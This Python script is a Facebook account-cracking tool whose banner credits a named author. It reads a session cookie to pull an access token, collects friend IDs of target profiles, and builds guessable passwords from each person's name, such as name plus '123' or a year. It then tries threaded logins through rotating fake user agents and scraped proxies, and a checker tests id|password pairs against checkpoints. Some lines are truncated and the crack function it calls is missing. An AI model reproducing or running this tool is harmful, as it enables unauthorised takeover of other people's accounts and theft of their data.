#https://youtube.com/channel/UCbT--Z1XzQpSUgjD6bfzzUA

#-----------------[ IMPORT-MODULE ]-------------------

from bs4 import BeautifulSoup as sop

import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

import time

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

pretty.install()

CON=sol()

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

#------------------[ USER-AGENT ]-------------------#

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

        prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

        open('.prox.txt','w').write(prox)

except Exception as e:

        print(' \x1b[1;91m^Z\x1b[1;96m^Z\x1b[1;92m^Z \x1b[1;96m[YM.AYMAN]')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

        a='Mozilla/5.0 (Symbian/3; Series60/'

        b=random.randrange(1, 9)

        c=random.randrange(1, 9)

        d='Nokia'

        e=random.randrange(100, 9999)

        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

        g=random.randrange(1, 9)

        h=random.randrange(1, 4)

        i=random.randrange(1, 4)

        j=random.randrange(1, 4)

        k='Mobile Safari/535.1'

        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

        ugen2.append(uaku)

        aa='Mozilla/5.0 (Linux; U; Android'

        b=random.choice(['6','7','8','9','10','11','12'])

        c=' en-us; GT-'

        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        e=random.randrange(1, 999)

        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

        h=random.randrange(73,100)

        i='0'

        j=random.randrange(4200,4900)

        k=random.randrange(40,150)

        l='Mobile Safari/537.36'

        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

        ugen.append(uaku2)

for x in range(10):

        a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'

        b=random.randrange(100, 9999)

        c=random.randrange(100, 9999)

        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        h=random.randrange(1, 9)

        i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

        j=random.randrange(1, 9)

        k=random.randrange(1, 9)

        l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

        uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():

        try:

                ua=open('bbnew.txt','r').read().splitlines()

                for ub in ua:

                        ugen.append(ub)

        except:

                a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text

                ua=open('.bbnew.txt','w')

                aa=re.findall('line">(.*?)<',str(a))

                for un in aa:

                        ua.write(un+'\n')

                ua=open('.bbnew.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m'

O = '\x1b[1;96m'

N = '\x1b[0m'

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

asu = random.choice([m,k,h,u,b])

#------------------[ MACHINE-SUPPORT ]---------------#

#.................... MACHINE-SUPPORT ]---------------#

def clear():

    os.system('clear')

    banner()

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "\x1b[1;91mPM"

else:

    a = ltx

    tag = "\x1b[1;96mAM"

def _AYMAN_(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)

def clear():

        os.system('clear')

def back():

        login()

#------------------[ LOGO-LAKNAT ]-----------------#

def banner():

        print(f"""

\033[1;32m  ░█████╗░██╗░░░██╗███╗░░░███╗░█████╗░███╗░░██╗

\033[1;97m  ██╔══██╗╚██╗░██╔╝████╗░████║██╔══██╗████╗░██║

\033[1;32m  ███████║░╚████╔╝░██╔████╔██║███████║██╔██╗██║

\033[1;97m  ██╔══██║░░╚██╔╝░░██║╚██╔╝██║██╔══██║██║╚████║

\033[1;32m  ██║░░██║░░░██║░░░██║░╚═╝░██║██║░░██║██║░╚███║

\033[1;97m  ╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

\033[1;32m____________________fuck Start ___________________

\033[1;32m[+]==============================================

\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mAYMAN ADIL

\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mAyman adil ( Efti )

\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35m Y-M-E

\033[1;32m[+] \033[1;36mWHATSAPP     :  \033[1;36m+8801317481984

\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m 3.0.1 《MAX》 free tools 😍

\033[1;32m[+] \033[1;32m[+]==========================================""")

os.system('clear')

banner()

#   os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_YM_AYMAN_WORLD.mp3")

print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;31mWhat Is Your Name\033[40m\033[00m')

AYMAN_NAME=input(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Your Name ➣\x1b[1;96m ')

#--------------------[ BAGIAN-MASUK ]--------------#

def login():

        try:

                token = open('.token.txt','r').read()

                cok = open('.cok.txt','r').read()

                tokenku.append(token)

                try:

                        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

                        sy2 = json.loads(sy.text)['name']

                        sy3 = json.loads(sy.text)['id']

                        menu(sy2,sy3)

                except KeyError:

                        login_lagi334()

                except requests.exceptions.ConnectionError:

                        li = ' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Check Your Internet Then Try Aging'

                        lo = mark(li, style='red')

                        sol().print(lo, style='purple')

                        exit()

        except IOError:

                login_lagi334()

def login_lagi334():

        try:

                os.system('clear')

                banner()

                asu = random.choice([m,k,h,b,u])

                cookie=input(f' \x1b[1;91m^Z\x1b[1;96m^Z\x1b[1;92m^Z Enter  Fresh Cookies :{asu} ')

                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) Appl>

                find_token = re.search("(EAAG\w+)", data.text)

                ken=open(".token.txt", "w").write(find_token.group(1))

                cok=open(".cok.txt", "w").write(cookie)

                print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m^Z\x1b[1;96m^Z\x1b[1;92m^Z Type \x1b[1;96mpython AYMAN.py');time.sleep(1)

                exit()

        except Exception as e:

                os.system("rm -f .token.txt")

                os.system("rm -f .cok.txt")

                print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mERROR BRO CHECK YOUR COOKIES ID')

                exit()

#------------------[ BAGIAN-MENU ]----------------#

def menu(my_name,my_id):

        try:

                token = open('.token.txt','r').read()

                cok = open('.cok.txt','r').read()

        except IOError:

                print(' \x1b[1;91m^Z\x1b[1;96m^Z\x1b[1;91m^Z Cookies Expired ')

                time.sleep(5)

                login_lagi334()

        os.system('clear')

        banner()

        ip = requests.get("https://api.ipify.org").text

        _AYMAN_(f'\x1b[1;91m┏────────────────────────┓')

        _AYMAN_(f'\x1b[1;91m│\033[47m\033[1;30mPREMIUM USER INFORMATION\033[40m\033[00m\x1b[1;91m│')

        _AYMAN_(f'\x1b[1;91m┠─────────────┯──────────┛')

        _AYMAN_(f'\x1b[1;91m│\x1b[1;92mYour Name\x1b[1;91m────╂➣\x1b[1;92m '+str(AYMAN_NAME))

        _AYMAN_(f'\x1b[1;91m│\x1b[1;92mYour ID Name\x1b[1;91m─╂➣\x1b[1;92m {my_name}')

        _AYMAN_(f'\x1b[1;91m│\x1b[1;92mCloning Date\x1b[1;91m─╂➣ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}')

        _AYMAN_(f"\x1b[1;91m│\x1b[1;92mCloning Time\x1b[1;91m─╂➣ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")

        _AYMAN_(f'\x1b[1;91m│\x1b[1;92mYour ID\x1b[1;91m──────╂➣\x1b[1;92m '+str(my_id))

        _AYMAN_(f'\x1b[1;91m│\x1b[1;92mYour IP\x1b[1;91m──────╂➣ \x1b[1;92m{ip}')

        _AYMAN_(f'\x1b[1;91m┗─────────────┛')

        _AYMAN_(f'\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m  CRACK METHOD  \033[40m\033[00m')

        _AYMAN_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')

        _AYMAN_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m PUBLIC CRACK')

        _AYMAN_(f'\x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m FIRST DUMP')

        _AYMAN_(f'\x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m RANDOM CRACK')

        _AYMAN_(f'\x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m CONTACT ME')

        _AYMAN_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m LOGOUT COOKIE & EXIT')

        _____AYMAN_____ = input('\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoice ➣\x1b[1;92m ')

        if _____AYMAN_____ in ['1']:

                os.system("play-audio Firsr_Follow_My_GitHub.mp3")

                F()

        if _____AYMAN_____ in ['2']:

                os.system("play-audio Firsr_Follow_My_GitHub.mp3")

                P()

        if _____AYMAN_____ in ['3']:

                os.system("play-audio Firsr_Follow_My_GitHub.mp3")

                os.system('rm -rf First_Dump')

                 #. os.system('git clone https://github.com/YMK4US4R/First_Dump.git')

                #. os.system('cd First_Dump && python FIRST_DUMP.py')

        if _____AYMAN_____ in ['4']:

                os.system("play-audio Firsr_Follow_My_GitHub.mp3")

                #   os.system('python AYMAN.py')

                if _____AYMAN_____ in ['5']:

                os.system("play-audio Firsr_Follow_My_GitHub.mp3")

                os.system("xdg-open https://www.facebook.com/im.not.a.king.bt.im.kingmeker")

        if _____AYMAN_____ in ['0']:

                os.system('rm -rf .token.txt')

                os.system('rm -rf .cookie.txt')

                print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LogOut Successful ')

                exit()

        else:

                print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;91m➣ Wrong Choice Bara 😩 ')

                back()

def error():

        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mSorry, Plz Choose the Right Menu')

        time.sleep(2)

        back()

#---------------------[APPLICATION CHECKER]---------------------#

def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[🎮] %s ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print(57*'-')

def P():

        try:

                token = open('.token.txt','r').read()

                cok = open('.cok.txt','r').read()

        except IOError:

                exit()

        try:

                os.system('clear')

                banner()

                jum = int(input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Terget Id Limit ➣ \x1b[1;92m'))

        except ValueError:

                print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWRONG TYPE ')

                exit()

        if jum<1 or jum>100:

                print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Type  ')

                exit()

        ses=requests.Session()

        yz = 0

        for met in range(jum):

                yz+=1

                kl = input(h+' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ ENTER PUBLIC ID \x1b[1;91m[\x1b[1;92m'+str(yz)+'\x1b[1;91m] \x1b[1;92m➣ \x1b[1;96m')

                uid.append(kl)

        for userr in uid:

                try:

                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()

                        for mi in col['friends']['data']:

                                try:

                                        iso = (mi['id']+'|'+mi['name'])

                                        if iso in id:pass

                                        else:id.append(iso)

                                except:continue

                except (KeyError,IOError):

                        pass

                except requests.exceptions.ConnectionError:

                        print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Check Your Internet Callection')

                        exit()

        try:

                print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Total Id ➣ \x1b[1;96m'+str(len(id)))

                Settings()

        except requests.exceptions.ConnectionError:

                print(f'{u}')

                print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Check Your Internet Callection')

                back()

        except (KeyError,IOError):

                print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Your Id Maybe Not Public\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Check Your Id\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;>

                time.sleep(3)

                back()

#-------------[ CRACK-FROM-FILE ]------------------#

def F():

    os.system('clear');

    D().plerr()

class D:

        def __init__(self):

                self.id = []

        def plerr(self):

                os.system("clear")

                banner()

                try:

                        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/AYMAN.txt     \033[40m\033[00m')

                        fileX = input (' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Enter Your File ➣\x1b[1;93m ')

                        for line in open(fileX, 'r').readlines():

                                id.append(line.strip())

                        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;96TOTAL ID ➣ \x1b[1;92m'+str(len(id)))

                        Settings()

                except IOError:

                        print(" \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)

                        F()

#-------------[ PENGATURAN-IDZ ]---------------#

def Settings():

        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[>

        hu = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')

        if hu in ['1','01']:

                muda=[]

                for bacot in sorted(id):

                        muda.append(bacot)

                bcm=len(muda)

                bcmi=(bcm-1)

                for xmud in range(bcm):

                        id2.append(muda[bcmi])

                        bcmi -=1

        elif hu in ['2','02']:

                for bacot in id:

                        xx = random.randint(0,len(id2))

                        id2.insert(xx,bacot)

        else:

                print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Option Bara')

                exit()

        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Mobile [BEST]')

        hc = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')

        if hc in ['1','01']:

                method.append('mobile')

        else:

                method.append('mobile')

        pwplus=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Manual Password \x1b[1;91>

        if pwplus in ['y','Y']:

                pwpluss.append('ya')

                print(f'Add Password Manual Minimam 6 Character')

                pwku=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Add Password Manual : ')

                pwkuh=pwku.split(',')

                for xpw in pwkuh:

                        pwnya.append(xpw)

        else:

                pwpluss.append('no')

        passwrd()

        exit()

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():

        print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30m𝔸𝕪𝕞𝕒𝕟 𝔸𝕕𝕚𝕝\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')

        print(f"\x1b[1;91m [😍] \x1b[1;92mYour Name         \x1b[1;91m➢ \x1b[1;92m"+str(AYMAN_NAME))

        print(f"\x1b[1;91m [🚀] \x1b[1;92mTOTAL ID          \x1b[1;91m➢ \x1b[1;92m"+str(len(id)))

        print(f"\x1b[1;91m [💉] \x1b[1;92mTODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")

        print(f"\x1b[1;91m [💉] \x1b[1;92mTODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")

        print(f"\x1b[1;91m [😩] \x1b[1;91mNOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")

        print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30m𝔸𝕪𝕞𝕒𝕟 𝔸𝕕𝕚𝕝\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●\n')

        with tred(max_workers=30) as pool:

                for yuzong in id2:

                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

                        frs = nmf.split(' ')[0]

                        pwv = []

                        if len(nmf)<6:

                                if len(frs)<3:

                                        pass

                                else:

                                        pwv.append(frs+'123')

                                        pwv.append(frs+'1234')

                                        pwv.append(frs+'12345')

                                        pwv.append(frs+'123456')

                                        pwv.append(frs+'2020')

                                        pwv.append(frs+'2021')

                                        pwv.append(frs+'2022')

                        else:

                                if len(frs)<3:

                                        pwv.append(nmf)

                                else:

                                        pwv.append(nmf)

                                        pwv.append(nmf+'@@')

                                        pwv.append(frs+'123')

                                        pwv.append(frs+'1234')

                                        pwv.append(frs+'12345')

                                        pwv.append(frs+'123456')

                                        pwv.append(frs+'2020')

                                        pwv.append(frs+'2021')

                                        pwv.append(frs+'2022')

                        if 'ya' in pwpluss:

                                for xpwd in pwnya:

                                        pwv.append(xpwd)

                        else:pass

                        if 'mobile' in method:

                                pool.submit(crack,idf,pwv)

                        elif 'free' in method:

                                pool.submit(crackfree,idf,pwv)

                        elif 'touch' in method:

                                pool.submit(cracktouch,idf,pwv)

        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ CRACK COMPLETE ')

        print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ OK : {h}%s '%(ok))

        print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣  Main Manu \x1b[1;92m[Y]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mExit [T]')

        woi = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Choose : ')

        if woi in ['y','Y']:

                back()

        else:

                print(f'\t \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Allah Hafiz Bro {u} ')

                time.sleep(2)

                exit()

#--------------------[ METODE-B-API ]-----------------#

#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#

def cek_opsi():

        c = len(akun)

        hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)

        cetak(nel(hu, title='CEK OPSI'))

        input(u+'['+h+'•'+u+'] Mulai')

        cek = '# PROSES CEK OPSI DIMULAI'

        sol().print(mark(cek, style='green'))

        love = 0

        for kes in akun:

                try:

                        try:

                                id,pw = kes.split('|')[0],kes.split('|')[1]

                        except IndexError:

                                time.sleep(2)

                                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))

                                print('\r%s---> Separator Not Supported For This Program%s'%(u,x))

                                continue

                        bi = random.choice([u,k,kk,b,h,hh])

                        print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()

                        ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'

                        ses = requests.Session()

                        header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-t>

                        hi = ses.get('https://mbasic.facebook.com')

                        ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'htm>

                        if "checkpoint" in ses.cookies.get_dict().keys():

                                try:

                                        jo = ho.find('form')

                                        data = {}

                                        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

                                        for anj in jo('input'):

                                                if anj.get('name') in lion:

                                                        data.update({anj.get('name'):anj.get('value')})

                                        kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')

                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

                                        opsi = kent.find_all('option')

                                        if len(opsi)==0:

                                                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

                                        else:

                                                for opsii in opsi:

                                                        print('\r%s---> %s%s'%(kk,opsii.text,x))

                                except:

                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

                                        print('\r%s---> Cannot Check Options%s'%(u,x))

                        elif "c_user" in ses.cookies.get_dict().keys():

                                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))

                        else:

                                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))

                        love+=1

                except requests.exceptions.ConnectionError:

                        print('')

                        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

                        sol().print(mark(li, style='red'))

                        exit()

        dah = '# DONE'

        sol().print(mark(dah, style='green'))

        exit()

#----------------------[ CEK-APLIKASI ]---------------------#

def cek_apk(session,cookie):

        w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text

        sop = BeautifulSoup(w,"html.parser")

        x = sop.find("form",method="post")

        game = [i.text for i in x.find_all("h3")]

        if len(game)==0:

                print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")

        else:

                for i in range(len(game)):

                        print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text

        sop = BeautifulSoup(w,"html.parser")

        x = sop.find("form",method="post")

        game = [i.text for i in x.find_all("h3")]

        if len(game)==0:

                print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")

        else:

                for i in range(len(game)):

                        print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':

        try:os.system('git pull')

        except:pass

        try:os.mkdir('OK')

        except:pass

        try:os.mkdir('CP')

        except:pass

        try:os.mkdir('DUMP')

        except:pass

        try:os.system('touch .prox.txt')

        except:pass

        login()
